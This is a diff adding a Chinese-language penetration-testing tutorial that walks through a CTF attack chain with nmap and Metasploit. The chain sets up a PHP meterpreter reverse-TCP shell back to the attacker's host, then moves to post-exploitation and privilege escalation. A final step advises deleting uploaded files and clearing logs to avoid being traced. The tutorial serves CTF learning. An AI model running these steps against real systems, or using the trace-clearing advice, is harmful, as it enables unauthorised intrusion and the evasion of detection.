@@ -1,0 +1,160 @@
+# Tips for  Penetration Testing - 2024
+
+# msfconsole的CFT流程
+
+參與 CTF (Capture The Flag) 比賽時，使用 `msfconsole`（Metasploit Framework 的交互式命令行）進行滲透測試是非常常見的流程。以下是從 `nmap` 掃描到使用 `msfconsole` 利用漏洞的完整流程示例。
+
+### 1. 信息收集：使用 `nmap` 進行端口掃描
+
+首先，對目標進行端口掃描以識別開放端口和服務。
+
+```bash
+nmap -A -T4 -p- <target-ip>
+nmap -Pn -sV -p- <target-ip>
+
+```
+
+- `A`: 執行操作系統檢測、版本檢測、腳本掃描和 traceroute。
+- `T4`: 提高掃描速度（適合在 CTF 中使用）。
+- `p-`: 掃描所有端口（1-65535）。
+- `<target-ip>`: 替換為目標的 IP 地址。
+
+### 2. 分析掃描結果
+
+根據 `nmap` 掃描結果，查看開放的端口和運行的服務。假設我們發現了以下結果：
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+
+```
+
+在這裡，我們看到了 SSH 和 HTTP 服務，並且 Web 服務使用的是 Apache 2.4.25。接下來，我們可以嘗試針對這些服務進行攻擊。
+
+```
+nmap --script vuln <target-ip>
+
+```
+
+- 這個命令會運行一組預定義的漏洞檢測腳本，涵蓋多種類型的漏洞，包括 SMB、HTTP、FTP 等。
+
+### 3. 使用 `msfconsole` 探索漏洞
+
+啟動 `msfconsole`：
+
+```bash
+msfconsole
+
+```
+
+在 `msfconsole` 中，我們可以利用已知的漏洞來嘗試攻擊目標。
+
+### 4. 搜索相關漏洞
+
+在 Metasploit 中搜索與 `Apache 2.4.25` 相關的漏洞：
+
+```bash
+search apache 2.4.25
+
+```
+
+假設我們發現了一個適用於這個版本的漏洞模組，例如 `exploit/unix/webapp/php_cgi_arg_injection`。
+
+### 5. 加載並配置漏洞模組
+
+選擇並加載漏洞模組：
+
+```bash
+use exploit/unix/webapp/php_cgi_arg_injection
+
+```
+
+配置目標選項：
+
+```bash
+set RHOSTS <target-ip>
+set RPORT 80
+
+```
+
+- `RHOSTS`: 設置目標 IP 地址。
+- `RPORT`: 設置目標端口，這裡為 80（HTTP）。
+
+### 6. 檢查與設置有效載荷（Payload）
+
+選擇合適的有效載荷。通常，默認的 `php/meterpreter/reverse_tcp` 是一個不錯的選擇。
+
+```bash
+set payload php/meterpreter/reverse_tcp
+
+```
+
+設置 `LHOST`（本機 IP 地址）和 `LPORT`（反向連接端口）：
+
+```bash
+set LHOST <your-ip>
+set LPORT 4444
+
+```
+
+- `LHOST`: 設置你的 IP 地址，用於接收反向連接。
+- `LPORT`: 設置本地的端口（通常為 4444）。
+
+### 7. 執行攻擊
+
+配置完成後，運行攻擊模組：
+
+```bash
+run
+
+```
+
+如果攻擊成功，你應該會看到 `Meterpreter` 會話彈出。
+
+### 8. 取得控制權並進行後續操作
+
+現在你已經獲得了目標的 `Meterpreter` shell，你可以執行各種命令來進行進一步的滲透測試或信息收集。例如：
+
+```bash
+sysinfo      # 查看目標系統信息
+getuid       # 確認當前用戶
+pwd          # 查看當前目錄
+ls           # 列出目錄內容
+
+```
+
+可以繼續進行權限提升、下載有價值的文件、或者維持持久控制權等操作。
+
+### 9. 權限提升 (Privilege Escalation)
+
+在 CTF 中，權限提升是非常常見的下一步。如果你是以非 root 用戶身份進入目標系統，可以使用 `local_exploit_suggester` 來尋找潛在的本地提權漏洞：
+
+```bash
+use post/multi/recon/local_exploit_suggester
+set SESSION <session-id>
+run
+
+```
+
+這將列出可用的本地提權模組，你可以選擇合適的模組來嘗試提升權限。
+
+### 10. 清理痕跡
+
+完成測試後，記得清理你所遺留下來的文件或會話，以免被追蹤。例如，刪除你上傳的惡意文件、清除日誌等。
+
+```bash
+rm <file>
+
+```
+
+並在 `meterpreter` 中終止會話：
+
+```bash
+exit
+
+```
+
+### 總結
+
+這是一個從使用 `nmap` 掃描到利用 `msfconsole` 進行漏洞利用的基本流程。在 CTF 比賽中，靈活運用這些工具能幫助你有效地找到並利用目標系統中的漏洞。隨著每個 CTF 挑戰的變化，你需要根據目標的不同服務和應用調整你的策略和工具選擇。
